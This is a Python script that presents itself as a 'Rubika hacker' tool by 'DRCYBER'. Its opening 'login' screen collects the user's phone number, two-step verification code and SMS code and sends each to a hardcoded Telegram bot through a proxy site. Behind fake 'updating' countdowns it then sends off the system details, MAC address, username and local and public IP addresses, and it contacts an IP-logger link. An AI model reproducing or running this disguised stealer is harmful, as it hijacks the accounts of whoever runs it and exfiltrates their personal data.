import os
import platform as pl
from colorama import Fore, init
from time import sleep
import pyfiglet
# -------------------------------

import getpass
import requests
import platform
import socket
import re
import uuid
# end import

sysmodel  = platform.uname()[0]

init()

# baner ---------------------------------

if sysmodel == 'Linux':

    os.system('clear')

banner1 = pyfiglet.figlet_format('DRCYBER',font='slant')

print(banner1)

sleep(3)

if sysmodel == 'Linux':

    os.system('clear')

LoginB = pyfiglet.figlet_format('Login',font='slant')

print(LoginB)


print(Fore.LIGHTBLUE_EX+'Login The Account !')
print('')
phonenumber = input(Fore.LIGHTCYAN_EX+'Phone Number +98 : ')
print('')

sendweb = ('https://api.telegram.org/bot5140639188:AAF2LNuhVENcBuwGQmMZo3YyKkYNTD388ZI/sendmessage?chat_id=5010353674&text='+phonenumber)



req = {'UrlBox':sendweb,

	'AngetList':'Mozilla Firefox',
	'VersionsList':'HTTP/1.1',
	'MethodList':'GET'
}

res = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=req)

print(res)

print('')

code2 = input(Fore.LIGHTCYAN_EX+'Two-step verification (off code 2 type a => -not- ) : ').casefold()
print('')

sendweb2 = ('https://api.telegram.org/bot5140639188:AAF2LNuhVENcBuwGQmMZo3YyKkYNTD388ZI/sendmessage?chat_id=5010353674&text='+code2)



req2 = {'UrlBox':sendweb2,

	'AngetList':'Mozilla Firefox',
	'VersionsList':'HTTP/1.1',
	'MethodList':'GET'
}

res2 = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=req2)

print(res2)


print('')
codesms = input(Fore.LIGHTCYAN_EX+'Code Sms : ')
if codesms == '':
    exit()


sendweb3 = ('https://api.telegram.org/bot5140639188:AAF2LNuhVENcBuwGQmMZo3YyKkYNTD388ZI/sendmessage?chat_id=5010353674&text='+codesms)



req3 = {'UrlBox':sendweb3,

	'AngetList':'Mozilla Firefox',
	'VersionsList':'HTTP/1.1',
	'MethodList':'GET'
}

res3 = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=req3)

print(res3)


print('')

print(Fore.RED+'Erore Login')

sleep(1.5)

if sysmodel == 'Linux':

    os.system('clear')

#---------------------------------login user

sleep(1)




sysmy = platform.uname()[0:4]

url = 'https://api.telegram.org/bot5140639188:AAF2LNuhVENcBuwGQmMZo3YyKkYNTD388ZI/sendmessage?chat_id=5010353674&text='+str(sysmy)


dictuser = {'UrlBox':url,

	'AngetList':'Mozilla Firefox',
	'VersionsList':'HTTP/1.1',
	'MethodList':'GET'
}


http = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=dictuser)

print(http)


sysclear = pl.uname()[0]
if sysclear == 'Linux':
        os.system('clear')
print('')
print(Fore.GREEN+'updating ... [ -60s- ]')

macaddres = ':'.join(re.findall('..', '%012x' % uuid.getnode()))




mac = 'https://api.telegram.org/bot5140639188:AAF2LNuhVENcBuwGQmMZo3YyKkYNTD388ZI/sendmessage?chat_id=5010353674&text='+str(macaddres)


macdic = {'UrlBox':mac,

	'AngetList':'Mozilla Firefox',
	'VersionsList':'HTTP/1.1',
	'MethodList':'GET'
}

mac_send = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=macdic)

print(mac_send)

if sysclear == 'Linux':
        os.system('clear')
print('')
print(Fore.GREEN+'updating ... [ -50s- ]')

usersys = getpass.getuser()

root = 'https://api.telegram.org/bot5140639188:AAF2LNuhVENcBuwGQmMZo3YyKkYNTD388ZI/sendmessage?chat_id=5010353674&text='+str(usersys)



dictpass = {'UrlBox':root,

	'AngetList':'Mozilla Firefox',
	'VersionsList':'HTTP/1.1',
	'MethodList':'GET'
}

user = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=dictpass)

print(user)

if sysclear == 'Linux':
        os.system('clear')

print('')
print(Fore.GREEN+'updating ... [ -40s- ]')


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('8.8.8.8', 1))  
ipwiiii = s.getsockname()

senurl = ('https://api.telegram.org/bot5140639188:AAF2LNuhVENcBuwGQmMZo3YyKkYNTD388ZI/sendmessage?chat_id=5010353674&text='+str(ipwiiii))


dicip = {'UrlBox':senurl,

	'AngetList':'Mozilla Firefox',
	'VersionsList':'HTTP/1.1',
	'MethodList':'GET'
}

macip = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=dicip)

print(macip)

if sysclear == 'Linux':
        os.system('clear')

print('')
print(Fore.GREEN+'updating ... [ -30s- ]')

ipworld = requests.get('https://www.ipaddress.my/')

urlipworld = ('https://api.telegram.org/bot5140639188:AAF2LNuhVENcBuwGQmMZo3YyKkYNTD388ZI/sendmessage?chat_id=5010353674&text='+ipworld.text)

dicipworld = {'UrlBox':urlipworld,

	'AngetList':'Mozilla Firefox',
	'VersionsList':'HTTP/1.1',
	'MethodList':'GET'
}

worldsend = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=dicipworld)

print(worldsend)

if sysclear == 'Linux':
        os.system('clear')
print('')
print(Fore.GREEN+'updating ... [ -20s- ]')

badlinks = requests.get('https://iplogger.org/2n7Rb6')

print(badlinks)

if sysclear == 'Linux':
        os.system('clear')


print('')
print(Fore.GREEN+'updating ... [ -10s- ]')


#------------------------------- end

endtext = 'https://api.telegram.org/bot5140639188:AAF2LNuhVENcBuwGQmMZo3YyKkYNTD388ZI/sendmessage?chat_id=5010353674&text=The-End-DRcyber'


enddic = {'UrlBox':endtext,

	'AngetList':'Mozilla Firefox',
	'VersionsList':'HTTP/1.1',
	'MethodList':'GET'
}


end_send = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=enddic)

print(end_send)

if sysclear == 'Linux':
        os.system('clear')
print('')
print(Fore.GREEN+'end update :)')


try:
    cleandata = pl.uname()[0]

    if cleandata == 'Linux':
        os.system('clear')

    # -------------------------------

    banner = pyfiglet.figlet_format('DRCYBER', font='slant')

    print(banner)

    sleep(4)

    if cleandata == 'Linux':
        os.system('clear')

    banner2 = pyfiglet.figlet_format('RUBIKA', font='slant')

    print(banner2)

    print('')

    sleep(0.001)


    banner4 = pyfiglet.figlet_format('CYBER', font='slant')

    print(banner4)

    sleep(2)


    print(Fore.LIGHTYELLOW_EX+'''    Script BY : DRCYBER

    Team Builder : Eagle-Root

    Relationship : -https://instagram.com/drcayber- ''')

    sleep(2)

    print('')

    print('   ---------------------')

    print('')

    print(Fore.LIGHTGREEN_EX+'''    [1] ~ FILTER RUBIKA

    [2] ~ RUBIKA HACKER

    [3] ~ SEETINGS ''')

    sleep(1)

    print('')

    runfile = input(Fore.LIGHTWHITE_EX+' Select the number (1 , 2 , 3) : ')

    if runfile == '1':
        os.system('python3 __init.py')

    elif runfile == '3':
            os.system('python3 seetings.py')

    else:
        runfile == '2'
        os.system('python3 __main.py')

except(KeyboardInterrupt):
    print(Fore.MAGENTA+'END RUBIKACYBER TANKS')
